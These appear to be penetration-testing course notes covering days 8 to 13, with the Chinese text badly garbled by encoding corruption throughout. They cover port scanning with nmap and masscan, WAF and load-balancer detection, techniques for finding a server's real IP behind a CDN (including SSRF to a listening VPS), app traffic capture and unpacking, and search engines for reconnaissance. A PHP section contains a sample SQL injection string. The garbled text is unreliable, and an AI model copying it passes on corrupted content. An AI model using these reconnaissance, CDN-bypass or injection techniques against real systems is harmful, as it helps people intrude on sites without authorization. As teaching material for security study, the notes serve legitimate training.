<h1 id="ç¬¬8å¤©-ä¿¡æ¯æ‰“ç‚¹-ç³»ç»Ÿç¯‡-ç«¯å£æ‰«æ-CDNæœåŠ¡-è´Ÿè½½å‡è¡¡-WAFé˜²ç«å¢™"><a href="#ç¬¬8å¤©-ä¿¡æ¯æ‰“ç‚¹-ç³»ç»Ÿç¯‡-ç«¯å£æ‰«æ-CDNæœåŠ¡-è´Ÿè½½å‡è¡¡-WAFé˜²ç«å¢™" class="headerlink" title="ç¬¬8å¤© ä¿¡æ¯æ‰“ç‚¹-ç³»ç»Ÿç¯‡&amp;ç«¯å£æ‰«æ&amp;CDNæœåŠ¡&amp;è´Ÿè½½å‡è¡¡&amp;WAFé˜²ç«å¢™"></a>ç¬¬8å¤© ä¿¡æ¯æ‰“ç‚¹-ç³»ç»Ÿç¯‡&amp;ç«¯å£æ‰«æ&amp;CDNæœåŠ¡&amp;è´Ÿè½½å‡è¡¡&amp;WAFé˜²ç«å¢™</h1><p>çŸ¥è¯†ç‚¹ï¼š<br>1ã€è·å–ç½‘ç»œä¿¡æ¯-æœåŠ¡å‚å•†&amp;ç½‘ç»œæ¶æ„<br>2ã€è·å–æœåŠ¡ä¿¡æ¯-åº”ç”¨åè®®&amp;å†…ç½‘èµ„äº§<br>3ã€è·å–é˜»ç¢ä¿¡æ¯-CDN&amp;WAF&amp;è´Ÿè½½&amp;é˜²ç«å¢™</p>
<p>è¯¦ç»†ç‚¹ï¼š<br>CDNæœåŠ¡ï¼ŒWAFé˜²ç«å¢™ï¼Œè´Ÿè½½å‡è¡¡ï¼Œé˜²ç«å¢™é˜»ç¢</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>1ã€ç½‘ç»œä¿¡æ¯è·å–-æœåŠ¡å‚å•†&amp;ç½‘ç»œæ¶æ„<br>é€šè¿‡åŸŸåä¿¡æ¯æŸ¥è¯¢è·å– IPã€äº‘æœåŠ¡å‚å•†ã€åŸŸåå‡ºå”®å‚å•†ã€æ³¨å†Œè€…é‚®ç®±ç­‰ä¿¡æ¯ï¼ˆå¯ä»¥ä½¿ç”¨å¨èƒæƒ…æŠ¥å¹³å°ï¼‰</p>
<p>2ã€æœåŠ¡ä¿¡æ¯è·å–-åè®®åº”ç”¨&amp;å†…ç½‘èµ„äº§<br>æ—æ³¨ï¼šæŸ¥è¯¢åŒä¸€æœåŠ¡å™¨ä¸‹çš„ä¸åŒWEBåº”ç”¨<br>Cæ®µï¼šæŸ¥è¯¢åŒä¸€ç½‘æ®µä¸‹ï¼Œä¸åŒæœåŠ¡å™¨éƒ¨ç½²çš„ä¸åŒWEBåº”ç”¨<br>nmap target -Pn -osscan-limit -sV</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Pnï¼šä¸æ£€æµ‹ä¸»æœºå­˜æ´» -osscan-limit:æ‰«æ“ä½œç³»ç»Ÿ </span><br><span class="line"></span><br><span class="line">-sVï¼šæ¢æµ‹æ‰“å¼€çš„ç«¯å£ä»¥ç¡®å®šæœåŠ¡/ç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p>3ã€é˜»ç¢ä¿¡æ¯è·å–-CDN&amp;WAF&amp;è´Ÿè½½&amp;é˜²ç«å¢™<br>è¶…çº§ping:CDNæœåŠ¡è¯†åˆ«ï¼ˆå…¨å›½ä¸ªåœ°å»pingç›®æ ‡åœ°å€ï¼Œçœ‹è®¿é—®çš„IPåœ°å€æ˜¯å¦ä¸åŒï¼‰<br>wafw00fè¯†åˆ«wafã€çœ‹å›¾è¯†åˆ«</p>
<p>4ã€ldbè¯†åˆ«è´Ÿè½½å‡è¡¡</p>
<p>ä½¿ç”¨å·¥å…·å»æ£€æµ‹è´Ÿè½½å‡è¡¡æ˜¯å¦å­˜åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ç›¸å…³åˆ©ç”¨é¡¹ç›®ï¼š</span><br><span class="line">Masscan:https://github.com/robertdavidgraham/masscan</span><br><span class="line">Wafwoof:https://github.com/Enablesecurity/wafw00f</span><br><span class="line">Kaliä¸Šè‡ªå¸¦Nmap,Masscan,lbdç­‰é¡¹ç›®ï¼Œè¶…çº§ping:ping.chinaz.com</span><br><span class="line">è¶…çº§ping:CDNæœåŠ¡è¯†åˆ«</span><br><span class="line">Masscan:ç«¯å£æ‰«æï¼Œåº”ç”¨åè®®</span><br><span class="line">Wafw00f:Webåº”ç”¨é˜²æŠ¤é˜²ç«å¢™è¯†åˆ«</span><br><span class="line">nampï¼šç«¯å£æ‰«æï¼Œåº”ç”¨åè®®ï¼Œé˜²ç«å¢™è¯†åˆ«</span><br><span class="line">lbd:è´Ÿè½½å‡è¡¡ï¼Œå¹¿åŸŸç½‘è´Ÿè½½å‡è¡¡ï¼Œåº”ç”¨å±‚è´Ÿè½½å‡è¡¡</span><br></pre></td></tr></table></figure>



<h1 id="ç¬¬9å¤©-ä¿¡æ¯æ‰“ç‚¹-CDNçƒ§è¿‡ç¯‡-æ¼æ´å›é“¾8æ¥å£æ¢é’ˆ-å…¨ç½‘æ‰«æŒ‡-åå‘ä»¶"><a href="#ç¬¬9å¤©-ä¿¡æ¯æ‰“ç‚¹-CDNçƒ§è¿‡ç¯‡-æ¼æ´å›é“¾8æ¥å£æ¢é’ˆ-å…¨ç½‘æ‰«æŒ‡-åå‘ä»¶" class="headerlink" title="ç¬¬9å¤© ä¿¡æ¯æ‰“ç‚¹-CDNçƒ§è¿‡ç¯‡&amp;æ¼æ´å›é“¾8æ¥å£æ¢é’ˆ&amp;å…¨ç½‘æ‰«æŒ‡&amp;åå‘ä»¶"></a>ç¬¬9å¤© ä¿¡æ¯æ‰“ç‚¹-CDNçƒ§è¿‡ç¯‡&amp;æ¼æ´å›é“¾8æ¥å£æ¢é’ˆ&amp;å…¨ç½‘æ‰«æŒ‡&amp;åå‘ä»¶</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çŸ¥è¯†ç‚¹ï¼š</span><br><span class="line">1ã€CDNçŸ¥è¯†-å·¥ä½œåŸç†åŠé˜»ç¢</span><br><span class="line">2ã€CDNé…ç½®-åŸŸå&amp;åŒºåŸŸ&amp;ç±»å‹</span><br><span class="line">3ã€CDNç»•è¿‡-é è°±åä½™ç§æŠ€æˆ˜æ³•</span><br><span class="line">4ã€CDNç»‘å®š-HOSTSç»‘å®šæŒ‡å‘è®¿é—®</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CDN æ˜¯æ„å»ºåœ¨æ•°æ®ç½‘ç»œä¸Šçš„ä¸€ç§åˆ†å¸ƒå¼çš„å†…å®¹åˆ†å‘ç½‘ã€‚ CDNçš„ä½œç”¨æ˜¯é‡‡ç”¨æµåª’ä½“æœåŠ¡å™¨é›†ç¾¤æŠ€æœ¯ï¼Œå…‹æœå•æœºç³»ç»Ÿè¾“å‡ºå¸¦å®½åŠå¹¶å‘èƒ½åŠ›ä¸è¶³çš„ç¼ºç‚¹ï¼Œå¯æå¤§æå‡ç³»ç»Ÿæ”¯æŒçš„å¹¶å‘æµæ•°ç›®ï¼Œå‡å°‘æˆ–é¿å…å•ç‚¹å¤±æ•ˆå¸¦æ¥çš„ä¸è‰¯å½±å“ã€‚</p>
</blockquote>
<p>#å‰ç½®çŸ¥è¯†<br>1.ä¼ ç»Ÿè®¿é—®ï¼šç”¨æˆ·è®¿é—®åŸŸå-&gt;è§£ææœåŠ¡å™¨IP-&gt;è®¿é—®ç›®æ ‡ä¸»æœº<br>2.æ™®é€šCDN:ç”¨æˆ·è®¿é—®åŸŸå-&gt;CDNèŠ‚ç‚¹-&gt;çœŸå®æœåŠ¡å™¨IP-&gt;è®¿é—®ç›®æ ‡ä¸»æœº<br>3.å¸¦WAFçš„CDN:ç”¨æˆ·è®¿é—®åŸŸå-&gt;CDNèŠ‚ç‚¹(WAF)-&gt;çœŸå®æœåŠ¡å™¨IP-&gt;è®¿é—®ç›®æ ‡ä¸»æœº</p>
<p>CDNçš„ä½¿ç”¨:åœ¨é˜¿é‡Œäº‘å¹³å°ä¸Šå»è¿›è¡ŒæŒ‰æ¯ä¸€æ­¥é…ç½®å³å¯ã€‚</p>
<p>#åˆ¤å®šæ ‡å‡†ï¼š<br>nslookup,å„åœ°ping(å‡ºç°å¤šä¸ªIPå³å¯ç”¨CDNæœåŠ¡)<br>#å‚è€ƒçŸ¥è¯†ï¼š<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a><br>å­åŸŸåï¼Œå»æ‰www,é‚®ä»¶æœåŠ¡å™¨ï¼Œå›½å¤–è®¿é—®ï¼Œè¯ä¹¦æŸ¥è¯¢ï¼ŒAPPæŠ“åŒ…<br>é»‘æš—ç©ºé—´å¼•æ“ï¼ˆyofoï¼‰ï¼Œé€šè¿‡æ¼æ´æˆ–æ³„éœ²è·å–ï¼Œæ‰«å…¨ç½‘ï¼Œä»¥é‡æ‰“é‡ï¼Œç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢ç­‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¼”ç¤ºæ¡ˆä¾‹ï¼š</span><br><span class="line">çœŸå®åº”ç”¨-CDNç»•è¿‡-æ¼æ´&amp;é—ç•™æ–‡ä»¶</span><br><span class="line">åŸç†ï¼š åˆ©ç”¨ssrfä½¿å¾—æœåŠ¡å™¨ä¸»åŠ¨è¯·æ±‚VPSåœ°å€ï¼Œæ­¤æ—¶é€šè¿‡åœ¨VPSåœ°å€ç›‘å¬è¯·æ±‚å³å¯å¾—çŸ¥çœŸå®åœ°å€ã€‚ï¼ˆç›¸å½“äºç›®æ ‡æœåŠ¡å™¨ä¸»åŠ¨è¯·æ±‚VPSåœ°å€ï¼Œvpsä¼šç›‘å¬åˆ°çœŸå®åœ°å€ï¼‰</span><br><span class="line"></span><br><span class="line">çœŸå®åº”ç”¨-CDNç»•è¿‡-å­åŸŸåæŸ¥è¯¢æ“ä½œ</span><br><span class="line">åŸç†ï¼šé…ç½®CDNæ—¶ç®¡ç†å‘˜è€ƒè™‘è´¹ç”¨é—®é¢˜å¯èƒ½ä¼šå°†å­åŸŸåæ’é™¤åœ¨å¤–ï¼Œæ­¤æ—¶é€šè¿‡æ‰‹æœºå­åŸŸåä¿¡æ¯å³å¯å¾—åˆ°çœŸå®åœ°å€ï¼ˆç”¨äºå­åŸŸååº”ç”¨å’Œæ ¹åŸŸååº”ç”¨éƒ¨ç½²åœ¨åŒä¸€æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼‰</span><br><span class="line"></span><br><span class="line">çœŸå®åº”ç”¨-CDNç»•è¿‡-æ¥å£æŸ¥è¯¢å›½å¤–è®¿é—®</span><br><span class="line">åŸç†ï¼šé…ç½®CDNæ—¶é€‰æ‹©åœ°åŸŸå¯èƒ½ä¼šä»…è®¾ç½®æˆå›½å†…ç”Ÿæ•ˆï¼Œæ­¤æ—¶ä½¿ç”¨å›½å¤–åœ°å€è®¿é—®è·å¾—çœŸå®åœ°å€</span><br><span class="line"></span><br><span class="line">çœŸå®åº”ç”¨-CDNç»•è¿‡-ä¸»åŠ¨é‚®ä»¶é…åˆå¤‡æ¡ˆ</span><br><span class="line">åŸç†:é€šè¿‡ç³»ç»ŸåŠŸèƒ½ï¼ˆå¦‚ï¼šå¯†ç æ‰¾å›å‘é€é‚®ä»¶ï¼ŒæŸ¥çœ‹é‚®ä»¶å‘é€æ–¹åœ°å€æ‰¾å¯»ï¼‰ï¼Œé€šè¿‡å¤‡æ¡ˆä¿¡æ¯ç¡®è®¤ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡å¤‡æ¡ˆçš„åœ°ç‚¹å»åˆ¤å®š</span><br><span class="line"></span><br><span class="line">çœŸå®åº”ç”¨-CDNç»•è¿‡-å…¨ç½‘æ‰«æFuckCDN</span><br><span class="line">åŸç†ï¼šæ‰«æå…¨çƒipåŒ¹é…webå†…å®¹ï¼Œå®ç”¨å·¥å…·åŒ¹é…æ‰«æç½‘æ®µtitleä¿¡æ¯ã€‚éœ€è¦å¤§é‡æ—¶é—´å¾ˆå¤šæƒ…å†µä¸‹ï¼Œä¸è¿‡ä¹Ÿæ˜¯æœ€ç¨³å®šçš„æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#å‚è€ƒçŸ¥è¯†ï¼š</span><br><span class="line">https://zhuanlan.zhihu.com/p/33440472</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/5771827.html</span><br><span class="line">å­åŸŸåï¼Œå»æ‰www,é‚®ä»¶æœåŠ¡å™¨ï¼Œå›½å¤–è®¿é—®ï¼Œè¯ä¹¦æŸ¥è¯¢ï¼ŒAPPæŠ“åŒ…</span><br><span class="line">é»‘æš—ç©ºé—´å¼•æ“ï¼Œé€šè¿‡æ¼æ´æˆ–æ³„éœ²è·å–ï¼Œæ‰«å…¨ç½‘ï¼Œä»¥é‡æ‰“é‡ï¼Œç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢ç­‰</span><br><span class="line">#æ¡ˆä¾‹èµ„æºï¼š</span><br><span class="line">è¶…çº§Ping:https://www.17ce.com/</span><br><span class="line">æ¥å£æŸ¥è¯¢ï¼šhttps://get-site-ip.com/</span><br><span class="line">å›½å¤–è¯·æ±‚ï¼šhttps://tools.ipip.net/cdn.php</span><br><span class="line">å…¨ç½‘æ‰«æï¼šhttps://github.com/Tai7sy/fuckcdn</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬10å¤©-ä¿¡æ¯æ‰“ç‚¹-APP-å°ç¨‹åºç¯‡-æŠ“åŒ…å°åŒ…-XPæ¡†æ¶-åç¼–è¯‘-èµ„äº§æå–"><a href="#ç¬¬10å¤©-ä¿¡æ¯æ‰“ç‚¹-APP-å°ç¨‹åºç¯‡-æŠ“åŒ…å°åŒ…-XPæ¡†æ¶-åç¼–è¯‘-èµ„äº§æå–" class="headerlink" title="ç¬¬10å¤© ä¿¡æ¯æ‰“ç‚¹-APP&amp;å°ç¨‹åºç¯‡&amp;æŠ“åŒ…å°åŒ…&amp;XPæ¡†æ¶&amp;åç¼–è¯‘&amp;èµ„äº§æå–"></a>ç¬¬10å¤© ä¿¡æ¯æ‰“ç‚¹-APP&amp;å°ç¨‹åºç¯‡&amp;æŠ“åŒ…å°åŒ…&amp;XPæ¡†æ¶&amp;åç¼–è¯‘&amp;èµ„äº§æå–</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### çŸ¥è¯†ç‚¹ï¼š</span><br><span class="line"></span><br><span class="line">1ã€å°ç¨‹åº-å¤–åœ¨-èµ„äº§æ”¶é›†</span><br><span class="line">2ã€APP-å¤–åœ¨&amp;å†…åœ¨-èµ„äº§æ”¶é›†</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### æ¼”ç¤ºæ¡ˆä¾‹ï¼š</span><br><span class="line"></span><br><span class="line">APP-å¤–åœ¨æŠ“åŒ…-Fd&amp;èŒ¶æ¯&amp;Burp</span><br><span class="line"></span><br><span class="line">APP-å¤–åœ¨å°åŒ…-å°åŒ…ç›‘å¬å·¥å…·</span><br><span class="line">ä½¿ç”¨å°åŒ…ç›‘å¬ä¹Ÿå¯æŠ“åˆ°æ•°æ®åŒ…</span><br></pre></td></tr></table></figure>

<p>APP-å†…åœ¨æå–-ApplnfoScanner</p>
<blockquote>
<p>ä¸€æ¬¾é€‚ç”¨äºä»¥HWè¡ŒåŠ¨&#x2F;çº¢é˜Ÿ&#x2F;æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸ºåœºæ™¯çš„ç§»åŠ¨ç«¯(Androidã€iOSã€WEBã€H5ã€é™æ€ç½‘ç«™)ä¿¡æ¯æ”¶é›†æ‰«æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆã€æ”»å‡»é˜Ÿæˆå‘˜ã€çº¢é˜Ÿæˆå‘˜å¿«é€Ÿæ”¶é›†åˆ°ç§»åŠ¨ç«¯æˆ–è€…é™æ€WEBç«™ç‚¹ä¸­å…³é”®çš„èµ„äº§ä¿¡æ¯å¹¶æä¾›åŸºæœ¬çš„ä¿¡æ¯è¾“å‡º,å¦‚ï¼šTitleã€Domainã€CDNã€æŒ‡çº¹ä¿¡æ¯ã€çŠ¶æ€ä¿¡æ¯ç­‰ã€‚</p>
</blockquote>
<p>APP-å†…åœ¨æœç´¢-åç¼–è¯‘è½½å…¥IDEA</p>
<ul>
<li>APP-èµ„æºæå–-å®‰è£…æ³¡&amp;èµ„æºæ–‡ä»¶<br>ä½¿ç”¨å®‰å“ä¿®æ”¹å¤§å¸ˆå¯¼å…¥apkæ–‡ä»¶ï¼Œå¯å¯¹åŸŸåèµ„æºè¿›è¡Œæ”¶é›†</li>
</ul>
<p>â€‹	è¿˜å¯ä½¿ç”¨IDEAå¯¹åç¼–è¯‘å‡ºçš„é¡¹ç›®è¿›è¡Œèµ„æºæ”¶é›†</p>
<ul>
<li>APP-æ¡†æ¶ä½¿ç”¨-Xposed&amp;JustTrustMe</li>
</ul>
<p>æŸäº›apkå­˜åœ¨åŠ å£³çš„æƒ…å†µï¼Œä¼šæ‰«æå¤±è´¥ï¼Œå¯ä»¥é€šè¿‡å·¥å…·åˆ¤æ–­apkæ˜¯å¦åŠ å£³</p>
<p>å¯é€šè¿‡å®‰è£…xpæ¡†æ¶çš„æ–¹å¼è¿›è¡Œè„±å£³å¤„ç†</p>
<p>å°ç¨‹åº-å¾®ä¿¡-ç”µè„‘ç‰ˆç™»å½•å¯åŠ¨æŠ“åŒ…åˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APPå®‰å“å…¥æ‰‹</span><br><span class="line">1ã€å¤–åœ¨-æŠ“åŒ…å°åŒ…-èµ„äº§å®‰å…¨æµ‹è¯•</span><br><span class="line">èµ„äº§æ”¶é›†-èµ„æºæå–-ICO,MD5,HASH-é»‘æš—å¼•æ“æœç´¢ç›¸å…³èµ„äº§</span><br><span class="line">2ã€å¤–åœ¨-åŠŸèƒ½é€»è¾‘</span><br><span class="line">3ã€å†…åœ¨-åç¼–è¯‘-JAVAä»£ç ä»£ç å®¡è®¡</span><br><span class="line">4ã€å†…åœ¨-åç¼–è¯‘-æå–RESèµ„æº-é»‘æš—èµ„äº§æ”¶é›†</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬11å¤©ä¿¡æ¯æ‰“ç‚¹-çº¢é˜Ÿå·¥å…·ç¯‡-Fofa-Quake-Kunyu-Suizeæ°´æ³½-Arç¯å¡”"><a href="#ç¬¬11å¤©ä¿¡æ¯æ‰“ç‚¹-çº¢é˜Ÿå·¥å…·ç¯‡-Fofa-Quake-Kunyu-Suizeæ°´æ³½-Arç¯å¡”" class="headerlink" title="ç¬¬11å¤©ä¿¡æ¯æ‰“ç‚¹-çº¢é˜Ÿå·¥å…·ç¯‡&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suizeæ°´æ³½&amp;Arç¯å¡”"></a>ç¬¬11å¤©ä¿¡æ¯æ‰“ç‚¹-çº¢é˜Ÿå·¥å…·ç¯‡&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suizeæ°´æ³½&amp;Arç¯å¡”</h1><p>çŸ¥è¯†ç‚¹ï¼š<br>1ã€ç½‘ç»œç©ºé—´å››å¤§å¼•æ“-Fofa&amp;Quake&amp;shodan&amp;2 oomeye I<br>2ã€è‡ªåŠ¨åŒ–ä¿¡æ¯æ”¶é›†é¡¹ç›®-ARLç¯å¡”&amp;Suizeæ°´æ³½s Kunyuiå¤èˆ†<br>3ã€å•ç‚¹åŠŸèƒ½ä¿¡æ¯æ”¶é›†é¡¹ç›®-ä¼æŸ¥ï¼šå­åŸŸåæŒ‡çº¹è¯†åˆ«ï¼šç¤¾å·¥ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##é»‘æš—å¼•æ“ï¼š</span><br><span class="line">https://fofa.so</span><br><span class="line">https://quake.360.cn</span><br><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br><span class="line">##è‡ªåŠ¨é¡¹ç›®ï¼š</span><br><span class="line">https://github.com/knownsec/Kunyu</span><br><span class="line">https://github.com/0x727/shuize 0x727</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">##ç›¸å…³èµ„æºï¼š</span><br><span class="line">https://forum.ywhack.com/center.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€æ¼”ç¤ºæ¡ˆä¾‹ï¼šç½‘ç»œç©ºé—´-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye</span><br><span class="line">å·¥å…·æµ‹è¯„ç½‘ç»œç©ºé—´å››å¤§é»‘æš—å½©æ“é›†åˆç‰ˆé¡¹ç›®</span><br><span class="line">finger:é€šè¿‡è°ƒç”¨zoomeyeså’Œfofaçš„æ¥å£å®ç°</span><br><span class="line">	é€šè¿‡fofaå’Œzoomeyesä¸¤ä¸ªæ¥å£å»è¿›è¡Œä¿¡æ¯æœé›†</span><br><span class="line">2å·¥å…·æµ‹è¯„-è‡ªåŠ¨åŒ–æ”¶é›†-ARLç¯å¡”&amp;Suizeæ°´æ³½&amp;Kunyu</span><br><span class="line">Kunyuï¼šé€šè¿‡è°ƒç”¨zoomeyes APIå®ç°èµ„äº§ä¿¡æ¯å’Œæ¼æ´ä¿¡æ¯æ”¶é›† è¿˜èƒ½å¤Ÿé€šè¿‡ä¸€ä¸ªapiå»è¿›è¡Œç›¸å…³æ¼æ´çš„æœé›†</span><br><span class="line">ARLç¯å¡”ï¼šè‡ªåŠ¨åŒ–ä¿¡æ¯æ”¶é›†å·¥å…·</span><br><span class="line">æ°´æ³½Suizeï¼šè®¤ä¸ºæ˜¯æš‚æ—¶æœ€å¥½ç”¨çš„ä¸€ä¸ªå·¥å…·ï¼Œèƒ½å¤Ÿæœé›†åˆ°æ›´åŠ å…¨é¢çš„ä¿¡æ¯ã€‚</span><br><span class="line">3ã€å·¥å…·æµ‹è¯„-å•ç‚¹åŠŸèƒ½å™¨ä¼æŸ¥æŸ¥&amp;å­åŸŸå&amp;æŒ‡çº¹è¯†åˆ«&amp;ç¤¾å·¥</span><br><span class="line">ç›¸æ¯”è‡ªåŠ¨åŒ–å…¨éƒ¨æœé›†çš„å·¥å…·ï¼Œæ‰€èƒ½æœé›†åˆ°çš„ä¿¡æ¯æ›´åŠ å‡†ç¡®ï¼Œä½†éƒ½æ˜¯åŒä¸€ä¸ªæ–¹é¢çš„ã€‚</span><br><span class="line">ä¸Šè¿°å·¥å…·éƒ½å¯ä»¥åœ¨è±è§’ç¤¾åŒºå»æ‰¾åˆ°ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬12å¤©ï¼šPHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-æ–‡ç« åŠŸèƒ½æ˜¾ç¤º-æ•°æ®åº“æ“ä½œ-æ•°æ®æ¥å—"><a href="#ç¬¬12å¤©ï¼šPHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-æ–‡ç« åŠŸèƒ½æ˜¾ç¤º-æ•°æ®åº“æ“ä½œ-æ•°æ®æ¥å—" class="headerlink" title="ç¬¬12å¤©ï¼šPHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®_æ–‡ç« åŠŸèƒ½æ˜¾ç¤º_æ•°æ®åº“æ“ä½œ_æ•°æ®æ¥å—"></a>ç¬¬12å¤©ï¼šPHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®_æ–‡ç« åŠŸèƒ½æ˜¾ç¤º_æ•°æ®åº“æ“ä½œ_æ•°æ®æ¥å—</h1><p>æ¥ä¸‹æ¥å‡ å¤©å°±éƒ½æ˜¯PHPç›¸å…³çš„çŸ¥è¯†ï¼Œä½†æ˜¯ç”±äºç°åœ¨çš„ç¤¾ä¼šç¯å¢ƒï¼ŒPHPè¯­è¨€çš„é€æ¸æ·˜æ±°ï¼Œæ‰€ä»¥PHPçš„ç›¸å…³ç¬”è®°å°±ç²—ç•¥å¤§æ¦‚è¿‡ä¸€éã€‚</p>
<p>é¦–å…ˆctfä¸­æ³¨æ„çš„æ˜¯phpä¸­çš„å•åŒå¼•å·çš„åŒºåˆ«ï¼Œå•å¼•å·ä¸è§£æå˜é‡ï¼ŒåŒå¼•å·èƒ½å¤Ÿè§£æå˜é‡</p>
<p>çŸ¥è¯†ç‚¹ï¼š<br>1ã€PHPå…¥é—¨-è¯­æ³•&amp;æäº¤ç­‰<br>2ã€MsQLå…¥é—¨-æ•°æ®åº“æ“ä½œ<br>3ã€HTML+CS5å…¥é—¨-æ ·å¼ç¼–æ’</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>å°è¿ªåšå®¢æ–‡ç« é˜…è¯»åŠŸèƒ½åˆæ­¥å®ç°</p>
<p>å®ç°åŠŸèƒ½ï¼š<br>å‰ç«¯æ–‡ç« å¯¼èˆªï¼Œç‚¹å…¥å†…å®¹æ˜¾ç¤ºï¼Œæ›´æ”¹Iâ™ªæ˜¾ç¤ºä¸åŒå†…å®¹<br>å®ç°æ­¥éª¤ï¼š<br>1ã€å‰ç«¯é¡µé¢æ˜¾ç¤ºç¼–å†™-HTML&amp;CSS<br>HTML æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºç½‘é¡µçš„æ ‡è®°è¯­è¨€ï¼Œå…¨ç§°ä¸ºè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ã€‚ä½¿ç”¨htmlæ„é€ æ˜¾ç¤ºå‰ç«¯æ–‡ç« å¯¼èˆªç«™ç‚¹ã€‚</p>
<p>2ã€æ•°æ®åº“æ–‡ç« æ•°æ®å¯¼å…¥-MySQLå·¥æ“ä½œ<br>é¦–å…ˆé…ç½®æ•°æ®åº“è¿æ¥â€“éªŒè¯æ•°æ®åº“é…ç½®â€“å®šä¹‰æ•°æ®æŸ¥è¯¢åˆ°çš„å˜é‡å¹¶èµ‹å€¼â€“è¿æ¥å…·ä½“è¡¨â€“æ‰§è¡Œå…·ä½“å­—æ®µæ˜¾ç¤º</p>
<p>æ¯æ¬¡æŸ¥è¯¢æ•°æ®æ—¶éƒ½éœ€è¦æ‰§è¡Œæ ¸æŸ¥æ•°æ®åº“é…ç½®çš„è¯­å¥æ‰€ä»¥å¯ä»¥æŠŠæ•°æ®åº“è¿æ¥é…ç½®å†™æˆé…ç½®æ–‡ä»¶</p>
<p>3ã€PHPæ“ä½œMYSQLç¼–å†™-PHPå˜é‡æäº¤<br>è¦å®ç°æäº¤ä¸€ä¸ªå‚æ•°ä¼ åˆ°æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œéœ€è¦å…ˆé€šè¿‡GETè·å–æäº¤çš„å‚æ•°ï¼Œç„¶åé€šè¿‡æ•°æ®åº“è¯­æ³•ï¼ˆwhere id &#x3D; ?ï¼‰æŒ‡å®šæŸ¥è¯¢å†…å®¹(æ­¤å¤„å› ä¸ºæ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œé™åˆ¶å°±å¯¼è‡´äº†sqlæ³¨å…¥ï¼Œä¾‹å¦‚where id&#x3D;1 union select name from admin)</p>
<p>é™¤äº†ä½¿ç”¨GETä¼ å‚å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨PSOTå’ŒREQUESTä¼ å‚ï¼Œè¿™æ ·å°±æ˜¯sqlæ³¨å…¥ä¸­çš„getæ–¹å¼å’Œpostæ–¹å¼æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç»„ä»¶ï¼š</span><br><span class="line">Navicat:æ“ä½œæ•°æ®åº“</span><br><span class="line">Dreamweaver:å‰ç«¯é¡µé¢è®¾è®¡</span><br><span class="line">PhpStorm:PHPå¼€å‘IDE</span><br><span class="line">phpStudy:PHPæ­å»ºç¯å¢ƒ</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬13å¤©-PHPå¼€å‘ä¸ªäººåšå®¢é¡¹ç›®8-æ–‡ä»¶æ“ä½œç±»-ç¼–è¾‘å™¨-ä¸Šä¼ ä¸‹è½½åˆ é™¤è¯»å†™"><a href="#ç¬¬13å¤©-PHPå¼€å‘ä¸ªäººåšå®¢é¡¹ç›®8-æ–‡ä»¶æ“ä½œç±»-ç¼–è¾‘å™¨-ä¸Šä¼ ä¸‹è½½åˆ é™¤è¯»å†™" class="headerlink" title="ç¬¬13å¤© PHPå¼€å‘ä¸ªäººåšå®¢é¡¹ç›®8&amp;æ–‡ä»¶æ“ä½œç±»&amp;ç¼–è¾‘å™¨&amp;ä¸Šä¼ ä¸‹è½½åˆ é™¤è¯»å†™"></a>ç¬¬13å¤© PHPå¼€å‘ä¸ªäººåšå®¢é¡¹ç›®8&amp;æ–‡ä»¶æ“ä½œç±»&amp;ç¼–è¾‘å™¨&amp;ä¸Šä¼ ä¸‹è½½åˆ é™¤è¯»å†™</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ–‡ä»¶æ“ä½œç±»ä»£ç ç¼–å†™<br>2ã€æ–‡ä»¶ä¸Šä¼ &amp;ä¸‹è½½&amp;åˆ é™¤</p>
